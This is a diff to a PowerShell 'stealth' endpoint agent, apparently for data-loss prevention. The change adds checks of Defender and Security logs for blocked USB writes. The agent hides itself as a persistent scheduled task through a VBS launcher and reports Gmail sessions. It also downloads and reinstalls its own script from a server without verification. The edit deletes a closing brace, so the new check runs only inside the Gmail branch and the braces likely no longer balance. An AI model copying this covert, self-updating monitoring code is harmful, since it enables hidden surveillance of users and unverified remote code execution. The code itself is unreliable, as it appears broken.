@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.6.5
+# Version: 1.6.6
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 1. ENVIRONMENT SANITATION
@@ -54,7 +54,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.6.5..."
+        Log-Message "Initiating User-Level Persistent Install v1.6.6..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -70,7 +70,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.5" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.6" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -84,7 +84,7 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
         
         Start-ScheduledTask -TaskName $TaskName | Out-Null
-        Log-Message "User-Mode v1.6.5 Active."
+        Log-Message "User-Mode v1.6.6 Active."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
             exit
         }
@@ -115,7 +115,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.6.5 Started. ID: $AgentId"
+    Log-Message "Agent v1.6.6 Started. ID: $AgentId"
     
     # 5. DLP MONITORING STATE
     $KnownDrives = @()
@@ -124,6 +124,41 @@ try {
     $LastIpCheck = 0
     $CachedPubIp = "Unknown"
     $CachedLocIp = "Unknown"
+    
+    $LastBlockCheck = Get-Date
+
+    function Check-BlockedEvents {
+        try {
+            # 1. Check Windows Defender / ASR Rule blocks (Event ID 1121)
+            $DefenderEvents = Get-WinEvent -FilterHashtable @{
+                LogName = 'Microsoft-Windows-Windows Defender/Operational'
+                Id = 1121
+                StartTime = $script:LastBlockCheck
+            } -ErrorAction SilentlyContinue
+
+            foreach ($Event in $DefenderEvents) {
+                if ($Event.Message -match "Removable" -or $Event.Message -match "USB") {
+                    Send-DlpEvent -Type "usb_blocked_attempt" -Details "Defender ASR: Blocked attempted write to USB. Event ID 1121." -Severity "critical"
+                }
+            }
+
+            # 2. Check Security Log for Access Denied (Event ID 4656/4663)
+            # This handles GPO 'Deny Write Access' blocks if auditing is enabled
+            $SecurityEvents = Get-WinEvent -FilterHashtable @{
+                LogName = 'Security'
+                Id = 4656, 4663
+                StartTime = $script:LastBlockCheck
+            } -ErrorAction SilentlyContinue
+
+            foreach ($Event in $SecurityEvents) {
+                if ($Event.Message -match "Removable" -and ($Event.Message -match "Access: Denied" -or $Event.Message -match "Result: Failure")) {
+                    Send-DlpEvent -Type "usb_blocked_attempt" -Details "OS Blocked: Attempted write to Removable Storage. Event ID $($Event.Id)." -Severity "critical"
+                }
+            }
+
+            $script:LastBlockCheck = (Get-Date).AddSeconds(-1) # Overlap by 1s to ensure no misses
+        } catch { Log-Message "BlockCheck Warn: $($_.Exception.Message)" }
+    }
 
     while ($true) {
         try {
@@ -189,10 +224,11 @@ try {
             $GmailProc = Get-Process | Where-Object { $_.MainWindowTitle -match "Gmail" }
             if ($GmailProc) {
                 Send-DlpEvent -Type "gmail_detected" -Details "Active Gmail session detected in browser ($($GmailProc.ProcessName))" -Severity "medium"
-            }
+            # --- BLOCK ATTEMPT MONITORING ---
+            Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.5")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.6")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
